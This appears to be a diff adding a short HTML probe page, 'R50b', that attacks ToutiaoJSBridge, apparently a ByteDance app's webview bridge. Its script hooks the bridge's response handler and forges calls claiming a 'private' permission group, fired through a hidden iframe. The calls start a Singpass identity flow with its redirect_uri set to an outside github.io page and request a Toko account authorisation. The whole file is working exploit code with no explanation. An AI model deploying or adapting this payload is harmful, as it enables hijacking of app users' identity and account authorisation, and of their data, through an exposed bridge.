@@ -1,0 +1,21 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>R50b</title></head><body>
+<h3 id="st">R50b</h3><script>
+(function(){
+  function send(t,d){try{document.getElementById('st').textContent=t+':'+String(d).substring(0,200);}catch(e){}}
+  if(!window.ToutiaoJSBridge){send('nobridge','');return;}
+  var orig=window.ToutiaoJSBridge._handleMessageFromToutiao;
+  window.ToutiaoJSBridge._handleMessageFromToutiao=function(s){
+    var t=(typeof s==='string')?s:JSON.stringify(s);send('resp',t.substring(0,400));
+    try{if(orig)orig.call(window.ToutiaoJSBridge,s);}catch(e){}};
+  function fire(id,fn,params){
+    var m={__msg_type:'call',__callback_id:id,func:fn,params:params,JSSDK:'5.2.30',
+           namespace:'',__iframe_url:'',permissionGroup:'private',token:'b-'+Date.now()};
+    window.ToutiaoJSBridge.invokeMethod(JSON.stringify(m));
+    var f=document.getElementById('__JSBridgeIframe__')||document.createElement('iframe');
+    f.id='__JSBridgeIframe__';f.style.display='none';document.documentElement.appendChild(f);
+    f.src='bytedance://dispatch_message/';send('fired',fn);}
+  setTimeout(function(){fire('b1','open_singpass_sdk',{request_id:'r50b',redirect_uri:'https://knull0d.github.io/jsbsweep/auth2.html'});},2000);
+  setTimeout(function(){fire('b2','call_toko_account_auth',{});},8000);
+})();
+</script></body></html>
